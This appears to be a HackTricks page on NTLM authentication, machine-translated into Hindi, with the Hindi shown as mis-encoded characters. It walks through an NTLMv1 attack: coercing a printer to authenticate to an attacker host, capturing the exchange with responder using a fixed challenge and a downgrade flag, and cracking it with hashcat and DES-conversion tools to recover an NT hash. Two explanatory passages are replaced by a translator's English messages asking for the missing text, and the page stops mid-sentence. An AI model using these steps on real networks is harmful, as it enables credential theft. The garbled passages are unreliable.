# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдБрдЪрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter рдкрд░** рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **hacktricks repo рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рдФрд░ [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**NTLM Credentials**: рдбреЛрдореЗрди рдирд╛рдо (рдпрджрд┐ рдХреЛрдИ рд╣реЛ), рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢.

**LM** рдХреЗрд╡рд▓ **Windows XP рдФрд░ рд╕рд░реНрд╡рд░ 2003** рдореЗрдВ **рд╕рдХреНрд╖рдо** рд╣реИ (LM рд╣реИрд╢реЗрдЬ рдХреЛ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ). LM рд╣реИрд╢ AAD3B435B51404EEAAD3B435B51404EE рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ LM рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (рдпрд╣ рдЦрд╛рд▓реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ LM рд╣реИрд╢ рд╣реИ).

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **Kerberos** рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП NTLM рдХреЗрд╡рд▓ рддрдм рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬрдм **рдХреЛрдИ Active Directory рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХреА рдЧрдИ рд╣реЛ,** **рдбреЛрдореЗрди рдореМрдЬреВрдж рди рд╣реЛ**, **Kerberos рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реЛ** (рдЦрд░рд╛рдм рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди) рдпрд╛ **рдХреНрд▓рд╛рдЗрдВрдЯ** рд╡реИрдз рд╣реЛрд╕реНрдЯ-рдирд╛рдо рдХреЗ рдмрдЬрд╛рдп IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ.

**NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЗ **рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯреНрд╕** рдореЗрдВ "**NTLMSSP**" **рд╣реЗрдбрд░** рд╣реЛрддрд╛ рд╣реИ.

рдкреНрд░реЛрдЯреЛрдХреЙрд▓: LM, NTLMv1 рдФрд░ NTLMv2 %windir%\Windows\System32\msv1\_0.dll рдореЗрдВ рд╕рдорд░реНрдерд┐рдд рд╣реИрдВ

## LM, NTLMv1 рдФрд░ NTLMv2

рдЖрдк рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

### GUI

_secpol.msc_ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ -> рд╕реНрдерд╛рдиреАрдп рдиреАрддрд┐рдпрд╛рдБ -> рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк -> рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛: LAN рдореИрдиреЗрдЬрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрддрд░. рдпрд╣рд╛рдБ 6 рд╕реНрддрд░ рд╣реИрдВ (0 рд╕реЗ 5 рддрдХ).

![](<../../.gitbook/assets/image (92).png>)

### рд░рдЬрд┐рд╕реНрдЯреНрд░реА

рдпрд╣ рд╕реНрддрд░ 5 рд╕реЗрдЯ рдХрд░реЗрдЧрд╛:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## рдмреЗрд╕рд┐рдХ NTLM рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

1. **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЕрдкрдиреЗ **рдкреНрд░рдорд╛рдг-рдкрддреНрд░** рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ
2. рдХреНрд▓рд╛рдЗрдВрдЯ рдорд╢реАрди **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рднреЗрдЬрддреА рд╣реИ**, **рдбреЛрдореЗрди рдирд╛рдо** рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рд╕рд╣рд┐рдд
3. **рд╕рд░реНрд╡рд░** **рдЪреБрдиреМрддреА** рднреЗрдЬрддрд╛ рд╣реИ
4. **рдХреНрд▓рд╛рдЗрдВрдЯ** рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╣реИрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЪреБрдиреМрддреА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рднреЗрдЬрддрд╛ рд╣реИ
5. **рд╕рд░реНрд╡рд░**, **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** рдХреЛ **рдбреЛрдореЗрди рдирд╛рдо, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо, рдЪреБрдиреМрддреА рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреЗрдЬрддрд╛ рд╣реИред рдпрджрд┐ Active Directory рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдбреЛрдореЗрди рдирд╛рдо рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рд╣реИ, рддреЛ рдкреНрд░рдорд╛рдг-рдкрддреНрд░ **рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪреЗ рдЬрд╛рддреЗ рд╣реИрдВ**ред
6. **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╕рдм рдХреБрдЫ рд╕рд╣реА рд╣реИ** рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдЬрд╛рдирдХрд╛рд░реА рднреЗрдЬрддрд╛ рд╣реИ

**рд╕рд░реНрд╡рд░** рдФрд░ **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░** **Netlogon** рд╕рд░реНрд╡рд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рд╕рд░реНрд╡рд░ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ (рдпрд╣ **NTDS.DIT** рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ рд╣реЛрддрд╛ рд╣реИ)ред

### рд▓реЛрдХрд▓ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпреЛрдЬрдирд╛

рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд╣реА рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ **рдкрд╣рд▓реЗ рдЙрд▓реНрд▓реЗрдЦрд┐рдд рд╣реИ** рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдХреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╣реИрд╢** рдХрд╛ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ рдЬреЛ **SAM** рдлрд╛рдЗрд▓ рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдкреВрдЫрдиреЗ рдХреЗ рдмрдЬрд╛рдп, **рд╕рд░реНрд╡рд░ рд╕реНрд╡рдпрдВ рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛** рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### NTLMv1 рдЪреБрдиреМрддреА

**рдЪреБрдиреМрддреА рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯреНрд╕** рд╣реЛрддреА рд╣реИ рдФрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ 24 рдмрд╛рдЗрдЯреНрд╕** рд▓рдВрдмреА рд╣реЛрддреА рд╣реИред

**рд╣реИрд╢ NT (16рдмрд╛рдЗрдЯреНрд╕)** рдХреЛ **3 рднрд╛рдЧреЛрдВ рдореЗрдВ 7рдмрд╛рдЗрдЯреНрд╕ рдкреНрд░рддреНрдпреЗрдХ** рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (7B + 7B + (2B+0x00\*5)): **рдЕрдВрддрд┐рдо рднрд╛рдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рднрд░рд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдлрд┐рд░, **рдЪреБрдиреМрддреА** рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рднрд╛рдЧ рдХреЗ рд╕рд╛рде **рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕рд┐рдлрд░** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ **рдкрд░рд┐рдгрд╛рдореА** рд╕рд┐рдлрд░ рдХрд┐рдП рдЧрдП рдмрд╛рдЗрдЯреНрд╕ рдХреЛ **рдЬреЛрдбрд╝рд╛** рдЬрд╛рддрд╛ рд╣реИред рдХреБрд▓: 8B + 8B + 8B = 24Bytesред

**рд╕рдорд╕реНрдпрд╛рдПрдВ**:

* **рд░реИрдВрдбрдордиреЗрд╕ рдХреА рдХрдореА**
* 3 рднрд╛рдЧреЛрдВ рдХреЛ **рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╣рдорд▓рд╛** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ NT рд╣реИрд╢ рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП
* **DES рдХреЛ рдХреНрд░реИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**
* рддреАрд╕рд░реА рдХреБрдВрдЬреА рд╣рдореЗрд╢рд╛ **5 рд╢реВрдиреНрдпреЛрдВ** рд╕реЗ рдмрдиреА рд╣реЛрддреА рд╣реИред
* рдпрджрд┐ **рдПрдХ рд╣реА рдЪреБрдиреМрддреА** рджреА рдЬрд╛рддреА рд╣реИ рддреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рднреА **рд╡рд╣реА** рд╣реЛрдЧреАред рдЗрд╕рд▓рд┐рдП, рдЖрдк **рдЪреБрдиреМрддреА** рдХреЗ рд░реВрдк рдореЗрдВ рдкреАрдбрд╝рд┐рдд рдХреЛ "**1122334455667788**" рдХрд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдкреВрд░реНрд╡рдирд┐рд░реНрдорд┐рдд рд░реЗрдирдмреЛ рдЯреЗрдмрд▓реНрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### NTLMv1 рд╣рдорд▓рд╛

рдЖрдЬрдХрд▓ Unconstrained Delegation рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдХреЛ рдкрд╛рдирд╛ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХрд╛ рдпрд╣ рдорддрд▓рдм рдирд╣реАрдВ рд╣реИ рдХрд┐ рдЖрдк **Print Spooler рд╕реЗрд╡рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ**ред

рдЖрдк AD рдкрд░ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╣рд╛рд╕рд┐рд▓ рдХрд┐рдП рдЧрдП рдХреБрдЫ рдкреНрд░рдорд╛рдг-рдкрддреНрд░/рд╕рддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреНрд░рд┐рдВрдЯрд░ рд╕реЗ рдХрд┐рд╕реА рдРрд╕реЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдЦрд┐рд▓рд╛рдл рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреЛ рдЖрдкрдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реЛред рдлрд┐рд░, `metasploit auxiliary/server/capture/smb` рдпрд╛ `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪреБрдиреМрддреА рдХреЛ 1122334455667788 рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрджрд┐ рдпрд╣ **NTLMv1** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рддреЛ рдЖрдк рдЗрд╕реЗ **рдХреНрд░реИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдпрджрд┐ рдЖрдк `responder` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддреЛ рдЖрдк **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдбрд╛рдЙрдирдЧреНрд░реЗрдб** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `--lm` рдлреНрд▓реИрдЧ рдХрд╛ **рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг NTLMv1 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (NTLMv2 рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИ)ред_

рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдкреНрд░рд┐рдВрдЯрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рдФрд░ рдХрдВрдкреНрдпреВрдЯрд░ рдЦрд╛рддреЗ **рд▓рдВрдмреЗ рдФрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдкрд╛рд╕рд╡рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╕рд╛рдорд╛рдиреНрдп **рд╢рдмреНрджрдХреЛрд╢реЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╢рд╛рдпрдж рдХреНрд░реИрдХ рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗ**ред рд▓реЗрдХрд┐рди **NTLMv1** рдкреНрд░рдорд╛рдгреАрдХрд░рдг **DES рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ** ([рдпрд╣рд╛рдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА](./#ntlmv1-challenge)), рдЗрд╕рд▓рд┐рдП DES рдХреЛ рдХреНрд░реИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдорд░реНрдкрд┐рдд рдХреБрдЫ рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЗрд╕реЗ рдХреНрд░реИрдХ рдХрд░ рдкрд╛рдПрдВрдЧреЗ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк [https://crack.sh/](https://crack.sh) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### NTLMv1 рд╣рдорд▓рд╛ hashcat рдХреЗ рд╕рд╛рде

NTLMv1 рдХреЛ NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ NTLMv1 рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдРрд╕реЗ рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рд╛рд░реВрдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ hashcat рдХреЗ рд╕рд╛рде рддреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдХрдорд╛рдВрдб
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
рдпрд╣ рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрдЧрд╛:
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
рдПрдХ рдлрд╛рдЗрд▓ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рд╣реЛ:
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
```
hashcat рдХреЛ рдЪрд▓рд╛рдПрдВ (hashtopolis рдЬреИрд╕реЗ рдЙрдкрдХрд░рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рддрд░рд┐рдд рдХрд░рдирд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рд╣реИ) рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреНрдпрдерд╛ рдЗрд╕рдореЗрдВ рдХрдИ рджрд┐рди рд▓рдЧреЗрдВрдЧреЗред
```
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдЗрд╕рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб password рд╣реИ рдЗрд╕рд▓рд┐рдП рд╣рдо рдбреЗрдореЛ рдХреЗ рдЙрджреНрджреЗрд╢реНрдп рд╕реЗ рдЪреАрдЯ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╣реИрдВ:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
рд╣рдореЗрдВ рдЕрдм hashcat-utilities рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреНрд░реИрдХ рдХрд┐рдП рдЧрдП des keys рдХреЛ NTLM рд╣реИрд╢ рдХреЗ рд╣рд┐рд╕реНрд╕реЛрдВ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Since the provided text is not visible, I'm unable to translate it. Please provide the text you want to be translated into Hindi, and I'll be happy to assist you.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
To provide an accurate translation, I need the specific English text from the file `windows-hardening/ntlm/README.md` that you want to be translated into Hindi. Please provide the text, and I will translate it for you while maintaining the markdown and HTML syntax.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 рдЪреИрд▓реЗрдВрдЬ

**рдЪреИрд▓реЗрдВрдЬ рдХреА рд▓рдВрдмрд╛рдИ 8 рдмрд╛рдЗрдЯреНрд╕ рд╣реИ** рдФрд░ **2 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИрдВ**: рдПрдХ **24 рдмрд╛рдЗрдЯреНрд╕** рд▓рдВрдмреА рд╣реЛрддреА рд╣реИ рдФрд░ **рджреВрд╕рд░реА** рдХреА рд▓рдВрдмрд╛рдИ **рдкрд░рд┐рд╡рд░реНрддрдирд╢реАрд▓** рд╣реЛрддреА рд╣реИред

**рдкрд╣рд▓реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдХреЗ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ рдЬреЛ **рдХреНрд▓рд╛рдЗрдВрдЯ рдФрд░ рдбреЛрдореЗрди** рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реЛрддреА рд╣реИ рдФрд░ **рдХреА** рдХреЗ рд░реВрдк рдореЗрдВ **NT рд╣реИрд╢** рдХрд╛ **MD4 рд╣реИрд╢** рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд┐рд░, **рдкрд░рд┐рдгрд╛рдо** рдХреЛ **рдХреА** рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **HMAC\_MD5** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЪреИрд▓реЗрдВрдЬ** рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдореЗрдВ, **8 рдмрд╛рдЗрдЯреНрд╕ рдХрд╛ рдПрдХ 